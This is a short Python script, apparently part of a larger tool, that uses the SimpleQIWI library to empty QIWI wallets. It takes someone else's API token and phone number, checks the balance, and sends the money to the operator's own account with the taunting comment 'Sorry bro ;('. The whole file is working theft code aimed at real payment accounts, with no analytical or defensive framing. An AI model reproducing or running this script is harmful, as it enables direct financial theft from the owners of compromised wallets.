#!/usr/bin/env python3

from core.colors import *
from SimpleQIWI import *

def viv():
	try:
		tok  = input(B+"\n[cbf]"+W+" Enter token: ")
		pho  = input(B+"[cbf]"+W+" Enter phone: ")
		pho2 = input(B+"[cbf]"+W+" Enter your phone: ")
		amou = int(input(B+"[cbf]"+W+" Enter amount: "))
		api  = QApi(token=tok, phone=pho)
		if api.balance != 0 and pho != pho2:
			try:
				print(G+"[+]"+W+" Balance Detect")
				print(G+"[+]"+W+" Balance =", api.balance)
				api.pay(account=pho2, amount=amou, comment="Sorry bro ;(")
				print(G+"[+]"+W+" Balance =", api.balance)
			except:
				print(R+"[err]"+W+" Balance found but unable to send money")
		elif api.balance !=0 and pho == pho2:
			print(R+"[err]"+W+" You can not transfer money from your account to yourself")
	except:
		print(R+"[err]"+W+" Unable to send money")
		pass